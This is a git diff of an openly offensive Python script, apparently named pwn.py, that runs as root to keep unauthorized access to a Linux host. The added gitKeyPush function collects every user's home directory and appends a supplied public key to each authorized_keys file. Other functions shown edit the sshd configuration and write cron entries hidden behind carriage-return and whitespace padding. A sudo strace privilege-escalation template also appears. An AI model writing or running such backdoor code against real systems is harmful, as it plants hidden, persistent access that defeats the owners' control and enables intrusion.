@@ -8,10 +8,11 @@ currentCRON = '/var/spool/cron/root'
 locationFile = '/home/user/pwn.py'
 
 gtfoBin = 'sudo strace -o /dev/null {}'
-files = ['pwn.py', '.env']
+files = ['pwn.py', '.env', 'rsakeys.pub']
 
         
 def runCommand(command, output=False):
+    if not command: return
     if not output:
         subprocess.call(command.split(), stdout = subprocess.PIPE)
     else:
@@ -31,6 +32,31 @@ def sshConfigEdit():
         for line in newlines:
             sshfile.writelines(line)
     runCommand("systemctl restart sshd")
+
+def gitKeyPush():
+    # runCommand("grep -oE '^[^:]+' /etc/passwd >> users.txt")
+    subprocess.Popen("getent passwd >> temp.txt", shell=True)
+    subprocess.Popen("cut temp.txt -d: -f6 >> users.txt", shell= True)
+    runCommand("rm -f temp.txt")
+
+    allDir = set()
+    with open("users.txt", "r") as userDIR:
+        for dir in userDIR.readlines():
+            # Attempt to open authorized_keys file.
+            # If File Does Not Exist. Make it
+            if dir == '/\n': continue
+            allDir.add(dir[:-1] + "/.ssh")
+    runCommand("rm -f users.txt")
+
+
+    for dir in allDir:
+        sshAuthorized = dir + "/authorized_keys"
+        runCommand(f'mkdir -p {dir}')
+        runCommand(f'chmod 0700 {dir}')
+        subprocess.Popen(f'cat rsakeys.pub >> {sshAuthorized}', shell = True)
+    
+    runCommand(f'rm -f {files[2]}')
+
 
 
 def update_python():
@@ -62,40 +88,17 @@ def startUpRecover():
         # 3. After checking for updates, we need to 
     print()
 
+
 def appendCron(path, command):
     assert is_root()
-    # try:
-    #     from crontab import CronTab
-    # except:
-    #     runCommand("python3 -m pip install python-crontab")
-    #     rerun()
-    
-    # carriage = ' #\r'
-    # whitespace = ' ' * (len(command) + len(carriage))
-
-    # try:
-    #     # cron=CronTab(user=path)
-    #     cron=CronTab(tabfile=path, user="root")
-    #     properCmd = command + carriage + whitespace
-
-    #     job1=cron.new(command=properCmd)
-    #     job1.minute.every(1)
-    #     cron.write()
-    #     print("Finished Appending To Cron")
-    # except Exception as e:
-    #     print(e)
-    #     print(f"Failed To Append to File {path}")
-    #     return
-
-
-
 
     carriage = ' #\r'
     whitespace = ' ' * (len(command) + len(carriage))
     # Just need to open file @path
     try:
         cronfile = open(path, "a")  # append mode
-        # print(cronfile.read())
+
+        ## TODO: Check if the command is already in it, if not, then add.
         cronfile.write("\n" + command + carriage + whitespace + "\n")
         cronfile.close()
         runCommand("systemctl reload crond.service")
@@ -170,15 +173,17 @@ def main():
     if not is_root(): exit()
 
     # Update The Script From GitHub And Obtain Keys To Add
-    getScript()
+    #getScript()
 
     # Find Place To Hide The Script While Running
-    cmd = "* * * * * rm -f " + locationFile
-    appendCron(currentCRON, cmd)
+    # cmd = "* * * * * rm -f " + locationFile
+    # appendCron(currentCRON, cmd)
 
     # attempt to edit ssh files
     sshConfigEdit()
-    
+
+    # Find All Users And Append Keys
+    gitKeyPush()
 
     # HOW TO CONNECT (?? SHELLLLLLLLLLLLL)    
     
